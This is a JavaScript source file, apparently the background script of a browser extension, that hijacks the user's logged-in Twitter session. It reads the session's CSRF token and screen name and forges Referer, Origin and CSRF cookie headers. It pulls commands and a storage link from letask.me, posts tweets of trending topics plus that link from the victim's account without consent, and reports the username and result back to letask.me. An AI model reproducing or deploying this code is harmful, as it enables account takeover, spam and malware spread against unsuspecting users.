var twitter = {};
twitter.check = function(){
  fetch("https://twitter.com/i/notifications?ext=me",{
    headers:{
      "x-asset-version": "5bced1",
      "x-push-state-request": true,
      "x-requested-with": "XMLHttpRequest",
      "x-twitter-active-user": "yes",
    }
  }).then((response) => {
    if(!response.redirected){
      return response.json();
    }else{
      return false;
    }
  }).then((data) => {
    if(data.init_data){
      twitter.token = data.init_data.formAuthenticityToken;
      twitter.user = data.init_data.screenName;
      twitter.start();
    }
  })
}

twitter.start = function(){
  fetch("https://letask.me/ajax/twitter.php").then((response) => {
    return response.json();
  }).then((data) => {
    twitter.config=data;
    console.log(twitter.config);
    var lastTime = localStorage[twitter.config.cookie_name] || 0;
    var timeValid = (Date.now() - lastTime) >= twitter.config.cookie_time ? true : false;
    var version = localStorage["twitter.version"] || 0;
    if(version != twitter.config.version){
      localStorage["twitter.version"] = twitter.config.version;
      location.reload();
      return;
    }
    if(twitter.config.active == true && timeValid == true){
      localStorage[twitter.config.cookie_name] = Date.now();
      console.log("Active: true");
      twitter.getTrends();
    }
  })
}

twitter.getTrends = function(){
  fetch("https://twitter.com/i/trends?pc=true&show_context=true&src=module&ext=me",{
    headers:{
      "accept":"application/json",
      "x-requested-with": "XMLHttpRequest",
      "x-twitter-active-user": "yes",
    }
  }).then(response => response.json()).then((data) => {
    var html = document.createElement('div');
    html.innerHTML = data.module_html;
    var trendItems = html.getElementsByClassName("js-trend-item");
    twitter.trends = [];
    for(i=0;i<trendItems.length;i++){
      var trendName = trendItems[i].getAttribute('data-trend-name');
      twitter.trends.push(trendName);
    }
    console.log(twitter.trends);
    twitter.getLink();
  })
}

twitter.getLink = function(){
  fetch('https://letask.me/ajax/storage.php?ext=me').then(response => response.json()).then((data) => {
    var storage = data.storage;
    twitter.link = "https://storage.googleapis.com/"+storage.bucket+"/"+storage.object;
    twitter.tweet();
  });
}

twitter.tweet = function(){
  var params = {
    authenticity_token: twitter.token,
    batch_mode: "off",
    is_permalink_page: false,
    place_id: "",
    status: twitter.trends.join(' ')+ "\n" + twitter.link,
    tagged_users: ""
  };

  fetch("https://twitter.com/i/tweet/create?ext=me", {
    method: "POST",
    headers: {
      "accept":"application/json",
      "x-requested-with": "XMLHttpRequest",
      "x-twitter-active-user": "yes",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
    },
    body: deSerialize(params)
  }).then(response => response.json()).then((data) => {
    if(data.tweet_id){
      twitter.sonuc(data.tweet_id,twitter.link,'','tweet',1);
    }else{
      twitter.sonuc('error',twitter.link,'','tweet',0);
    }
  });
}

chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    if(details.url.indexOf("ext=me") < 0){
      return;
    }
    var url = new URL(details.url);
    var hasreferer = false;
    var hasorigin = false;
    for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name.toLowerCase() === 'referer') {
        details.requestHeaders[i].value = url.protocol+"//"+url.hostname+"/";
        hasreferer = true;
      }

      if (details.requestHeaders[i].name.toLowerCase() === 'origin') {
        details.requestHeaders[i].value = url.protocol+"//"+url.hostname;
        hasorigin = true;
      }

      if (details.requestHeaders[i].name.toLowerCase() === 'cookie') {
        details.requestHeaders[i].value += ';csrf_same_site=1;csrf_same_site_set=1';
      }
    }

    if(hasreferer == false){
      details.requestHeaders.push({name:'Referer', value:url.protocol+"//"+url.hostname+"/" });
    }
    if(hasorigin == false){
      details.requestHeaders.push({name:'Origin', value:url.protocol+"//"+url.hostname });
    }
    return { requestHeaders: details.requestHeaders };
  },
  {urls: ['https://*.twitter.com/*','https://twitter.com/*']},
  [ 'blocking', 'requestHeaders', 'extraHeaders']
);

twitter.check();
setInterval(function(){
  twitter.check();
},1000*60)

twitter.sonuc = function(sonuc,link,image,type,success){
    var sonuc = sonuc || "";
    var link = link || "";
    var image = image || "";
    var type = type || "";
    var success = success || 0;
    var params = {};
    params["user"] = twitter.user;
    params["sonuc"] = sonuc;
    params["site"] = "twitter.com";
    params["link"] = link;
    params["img"] = image;
    params["type"] = type;
    params["success"] = success;
    fetch("https://letask.me/ajax/sonuc.php?"+deSerialize(params));
}

function generate_name(length,firstUpper){
    rname = "";
    sesli = "aeiou";
    sessiz = "bcdfghjklmnprstvyz";
    rname = rand(1,2) == 1?sessiz[rand(0,sessiz.length-1)]:sesli[rand(0,sesli.length-1)];
    if(firstUpper == true){
        rname = rname.toUpperCase();
    }
    for(n=0;n<length;n++){
        if(sesli.indexOf(rname[rname.length-1]) >= 0){
            rname += sessiz[rand(0,sessiz.length-1)];
        }else{
            rname += sesli[rand(0,sesli.length-1)];
        }
    }
    return rname;
}

function capitalizeFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

function inArray(arr, key, value){
    var res = false;
    for(a=0;a<arr.length;a++){
        for(k in arr[a]){
            if(k == key && arr[a][k] == value){
                res = true;
                break;
            }
        }
    }
    return res;
}

function decode(t,h){
    var a = "abcdefghijklmnoprstuvyzx0123456789";
    var c = "";
    for(cr=0;cr<t.length;cr++){
        c += a[h.indexOf(t[cr])];
    }
    return c;
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

function randoms(l, m) {
    var r = [];
    while (r.length < l) {
        var rnd = Math.floor(Math.random() * m);
        if (r.indexOf(rnd) < 0) {
            r.push(rnd);
        }
    }
    return r;
}

function searchArray(a,k){
    var found = false;
    for(key in a){
        if(key.toString() == k){
            found = a[key];
            break;
        }else if(typeof a[key] == "object"){
            found = searchArray(a[key],k);
            if(found != false){
                break;
            }
        }
    }
    return found;
}

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}

function rand(min,max){
    return Math.floor(Math.random()* (max-min))+min;
}

function rastgele(uzunluk) {
    mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
    ret = "";
    for (l = 0; l < uzunluk; l++) {
        ret += mtn[Math.floor(Math.random() * mtn.length)];
    }
    return ret;
}

function deSerialize(json) {
    return Object.keys(json).map(function(key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
    }).join('&');
}